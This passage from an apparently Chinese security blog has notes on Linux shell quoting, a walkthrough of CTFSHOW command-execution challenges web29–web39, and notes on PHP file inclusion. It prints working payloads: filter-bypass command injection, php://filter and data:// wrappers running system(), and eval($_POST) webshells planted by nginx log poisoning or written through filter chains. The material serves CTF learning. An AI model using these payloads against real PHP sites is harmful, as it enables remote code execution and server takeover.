title="Linux下的引号"></a>Linux下的引号</h3><p>linux中的单引号、双引号和反引号的特性</p><blockquote><p>单引号：会将其中内容都当做字符串，忽略所有命令和特殊字符</p><p>双引号：会解析其中的特殊字符和变量，如果要原样输出特殊字符需要用<code>\</code>转义</p><p>反引号：会将反引号中的字符串当作命令执行，反引号类似<code>$(command)</code></p></blockquote><p>shell中有两种方法作命令替换：把shell命令用反引号或者<code>$(…)</code>结构括起来，其中，<code>$(…)</code>格式受到POSIX标准支持，也利于嵌套。</p><p>反斜杠：</p><blockquote><p>反斜杠一般用作转义字符，或称逃脱字符，<br>Linux如果echo要让转义字符发生作用，就要使用-e选项，<br>且转义字符要使用双引号echo -e “\n”<br>反斜杠的另一种作用，就是当反斜杠用于一行的最后一个字符时，<br>Shell把行尾的反斜杠作为续行，这种结构在分几行输入长命令时经常使用。</p></blockquote><h3 id="linux-shell中的特殊符号"><a href="#linux-shell中的特殊符号" class="headerlink" title="linux shell中的特殊符号"></a>linux shell中的特殊符号</h3><h4 id="和-：命令替换"><a href="#和-：命令替换" class="headerlink" title="$()和 `` ：命令替换"></a>$()和 `` ：命令替换</h4><ul><li>`` 基本可在所以unix shell中使用，而 $() 不是所有shell都支持</li></ul><h4 id="：变量替换"><a href="#：变量替换" class="headerlink" title="${}：变量替换"></a>${}：变量替换</h4><p><code>$var</code>和<code>$&#123;var&#125;</code>效果类似，但 <code>$&#123; &#125;</code> 能更精确的界定变量名称的范围</p><p>如下，使用<code>echo $ab</code>想要输出的是<code>$a的内容+字符b</code>，但是会被解析成<code>$ab</code></p><p>一些更深入的用法：<a href="https://blog.csdn.net/x1269778817/article/details/46535729">https://blog.csdn.net/x1269778817/article/details/46535729</a></p><h4 id=""><a href="#" class="headerlink" title="$?"></a>$?</h4><p>$?表示上一条命令执行结束后的传回值。</p><ul><li>通常0代表执行成功</li><li>非0代表执行有误</li></ul><h4 id="IFS"><a href="#IFS" class="headerlink" title="$IFS"></a>$IFS</h4><p><a href="https://bash.cyberciti.biz/guide/$IFS">$IFS - Linux Shell Scripting Wiki (cyberciti.biz)</a></p><p><a href="https://blog.csdn.net/whuslei/article/details/7187639">Shell中的IFS解惑_Simple life-CSDN博客</a></p><p>简而言之，$IFS的默认值是 space, tab, newline</p><h4 id="gt-dev-null"><a href="#gt-dev-null" class="headerlink" title="&gt;/dev/null"></a>&gt;/dev/null</h4><p>/dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失</p><p>在执行了<code>&gt;/dev/null</code>后，标准输出就会不再存在， 没有任何地方能够找到输出的内容。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-命令执行</title>
      <link href="/posts/6388.html"/>
      <url>/posts/6388.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTFSHOW-命令执行"><a href="#CTFSHOW-命令执行" class="headerlink" title="CTFSHOW-命令执行"></a>CTFSHOW-命令执行</h1><h2 id="web29-通配符绕过"><a href="#web29-通配符绕过" class="headerlink" title="web29 通配符绕过"></a>web29 通配符绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仅过滤flag字符，i表示不区分大小写。方法很多。(由于浏览器的html解析逻辑，会把php当成注释处理，所以一定要记得看html以保证看到的是真的返回)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[&#x27;d&#x27;]);&amp;d=echo `cat flag.php`;</span><br></pre></td></tr></table></figure><h2 id="web30-反引号执行系统命令"><a href="#web30-反引号执行系统命令" class="headerlink" title="web30 反引号执行系统命令"></a>web30 反引号执行系统命令</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:42:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤flag|system|php，用`代替system即可。补充一些知识。</p><p>linux中的单引号、双引号和反引号的特性</p><blockquote><p>单引号：会将其中内容都当做字符串，忽略所有命令和特殊字符</p><p>双引号：会解析其中的特殊字符和变量，如果要原样输出特殊字符需要用<code>\</code>转义</p><p>反引号：会将反引号中的字符串当作命令执行，反引号类似<code>$(command)</code></p></blockquote><h2 id="web31-空格绕过"><a href="#web31-空格绕过" class="headerlink" title="web31 空格绕过"></a>web31 空格绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题把空格 和单引号’给过滤了，制表符%09可以代替空格。至于对cat，用more、less、/bin/ca*都是可以的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo%09`/bin/ca*%09fla*`;</span><br></pre></td></tr></table></figure><h2 id="web32-36-文件包含-伪协议"><a href="#web32-36-文件包含-伪协议" class="headerlink" title="web32-36 文件包含+伪协议"></a>web32-36 文件包含+伪协议</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件包含(include/require)+伪协议读文件： 因为分号被过滤了，这里改用?&gt;闭合。32-36相同playload。伪协议相关部分可以看看这篇文章：<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a> 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># php伪协议</span><br><span class="line">c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">c=include$_GET[a]?&gt;&amp;a=data://text/palin,&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br><span class="line">c=include$_GET[a]?&gt;&amp;a=data://text/palin;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==</span><br></pre></td></tr></table></figure><blockquote><p>33、在上一题基础上过滤了”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure><p>34、过滤了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure><p>35、 过滤了&lt;=</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure><p>36、过滤了数值，将参数改为字母即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure></blockquote><h2 id="web37-38-伪协议-日志文件getshell"><a href="#web37-38-伪协议-日志文件getshell" class="headerlink" title="web37-38 伪协议|日志文件getshell"></a>web37-38 伪协议|日志文件getshell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>include</code>预编译，运用伪协议读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>也可以配合<code>UA</code>头进行日志文件包含，设置<code>User-Agent: 一句话木马</code>：可以看到用的是nginx。改包，把<code>HOST</code>换一下就好了，放过去之后蚁剑连上就行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?c=/var/log/nginx/access.log HTTP/1.1</span><br><span class="line">Host: 8eb33014-6450-42ce-a300-148f42aa4b9a.challenge.ctf.show</span><br><span class="line">User-Agent: &lt;?php @eval($_POST[&#x27;d&#x27;]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 06:13:21</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用<code>?&gt;</code>来闭合php代码，使得其后的<code>.php</code>会被当中普通的html字符直接显示在页面上 记得引号绕过正则过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(&quot;tac fla&#x27;&#x27;g.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web40-无参RCE"><a href="#web40-无参RCE" class="headerlink" title="web40 无参RCE"></a>web40 无参RCE</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/posts/e8ab.html"/>
      <url>/posts/e8ab.html</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="LFI（本地文件包含）"><a href="#LFI（本地文件包含）" class="headerlink" title="LFI（本地文件包含）"></a>LFI（本地文件包含）</h2><p>(local file include) 本地文件包含。文件包含分为两种，一种是本地文件包含，一种是远程文件包含。很好理解，本地文件包含就是只能包含服务器中有的文件，而远程文件包含就是可以远程包含别的服务器的文件。这里一下就能知道。远程文件包含的危害肯定是大于本地文件包含的。</p><h2 id="文件包含的定义"><a href="#文件包含的定义" class="headerlink" title="文件包含的定义"></a>文件包含的定义</h2><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。注意我们这里的定义，<code>包含的文件不一定是后缀为php的文件，可以是任意文件类型</code>，只要其他含有php代码且语法正常那么系统都会把它当作一个php文件进行执行。所以我们可以<code>使用图片马加上文件包含达到getshell</code> 的操作。使用一般都比较的多，比如我们写多个页面，页头和页尾都使用相同的文件，那我们就没必要写这个重复的代码，只需要写一份文件然后再其他代码中直接包含进去。有利于代码复用。如果文件包含的文件类型是php的话会直接执行php的代码。如果他包含的是一个文本，那他就会直接把内容显示。</p><h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p><strong>PHP文件包含函数</strong>：</p><ol><li>include：<ul><li>包含并运行指定文件，在包含过程中出错会报错，<strong>不影响</strong>执行后续语句</li></ul></li><li>include_once：<ul><li>仅包含一次文件。会检查文件是否被包含过，若已被包含则不会再次包含</li></ul></li><li>require：<ul><li>在包含过程中出错，就会直接退出，<strong>不执行</strong>后续语句</li></ul></li><li>require_once：<ul><li>和 require 完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含</li></ul></li></ol><h2 id="文件包含的绕过"><a href="#文件包含的绕过" class="headerlink" title="文件包含的绕过"></a>文件包含的绕过</h2><h3 id="伪协议的妙用"><a href="#伪协议的妙用" class="headerlink" title="伪协议的妙用"></a>伪协议的妙用</h3><ul><li><p>伪协议的运用：<a href="https://na0h.cn/2021/02/25/php伪协议/">伪协议的学习</a>、<a href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议</a></p><ul><li><p>过滤器filter://读文件：<code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p></li><li><p>data://： 某些字符串被过滤，可以使用data协议编码后传入 如：php被替换为???，那么可以传入</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs</span><br></pre></td></tr></table></figure><blockquote><ol><li><p>convert.base64-deconde</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=shell.phpcontent=abPD9waHAgQGV2YWwoJF9SRVFVRVNUWzFdKT8+</span><br></pre></td></tr></table></figure></li><li><p>rot13</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=string.rot13/resource=shell.php(要进行两次url全编码)</span><br><span class="line">content=&lt;?php system(‘tac flag.php’);?&gt; （rot13）</span><br></pre></td></tr></table></figure></li><li><p>或者是filter协议写入</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php(要进行两次url全编码)</span><br><span class="line">content=&lt;?php @eval($_REQUEST[1]);?&gt;  （base64编码）</span><br></pre></td></tr></table></figure></li></ol></blockquote></li></ul></li></ul><h3 id="日志包含拿shell"><a href="#日志包含拿shell" class="headerlink" title="日志包含拿shell"></a>日志包含拿shell</h3><p>一些日志文件默认路径：</p><ol><li>nginx日志文件：/var/log/nginx/access.log</li><li>apache日志文件：/var/log/ apache | apache2 | httpd /access.log</li><li>iis日志文件：%systemroot%\system32\logfiles\</li></ol><p>下面用的是nginx的日志文件路径：/var/log/nginx/access.log</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在ua头写一句话，再传参包含即可</span><br><span class="line">user_agent：<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_post</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">然后：</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure><p><strong>ps：</strong></p><ol><li><strong>日志包含尽量一次成功，不然错误代码会影响后面代码解析</strong> <strong>可以事先在本地试一下再传</strong></li><li><strong>在Ua中传入不会进行解码，因此编码绕过是无效的</strong> <strong>而在url中写入则会被url编码，没到达php就会被写入日志文件，同样不行</strong></li></ol><h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户</a></p><p>利用条件：</p><ol><li>存在文件包含漏洞 or session反序列化漏洞</li><li>知道session文件存放路径，可以尝试默认路径</li><li>具有读取和写入session文件的权限</li></ol><p>由于php.ini默认配置的关系</p><ol><li><p><code>session.use_strict_mode默认值为0</code>， 此时用户可以自己定义Session ID 如：设置cookie：<code>PHPSESSID=hhh</code>，那么PHP会在服务器上创建一个文件：<code>/tmp/sess_hhh</code></p><blockquote><p>即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值由ini.get(“session.upload<em>progress.prefix”)+由我们构造的session.upload_progress.name值组成， 最后被写入sess</em>文件里</p></blockquote></li><li><p><code>session.upload_progress.cleanup = on</code> 会导致文件上传后，session文件内容立即清空 可以利用条件竞争，在session内容被清空前进行包含</p></li></ol><h3 id="协议绕过"><a href="#协议绕过" class="headerlink" title="协议绕过"></a>协议绕过</h3><blockquote><p><code>allow_url_fopen</code> 和 <code>allow_url_include</code> 主要是针对 <code>http</code> <code>ftp</code> 两种协议起作用， 因此可以使用SMB、WebDav协议等方式来绕过限制。</p></blockquote><h3 id="利用ssrf读取文件"><a href="#利用ssrf读取文件" class="headerlink" title="利用ssrf读取文件"></a>利用ssrf读取文件</h3><p><a href="https://www.jianshu.com/p/7fab00c11770">php 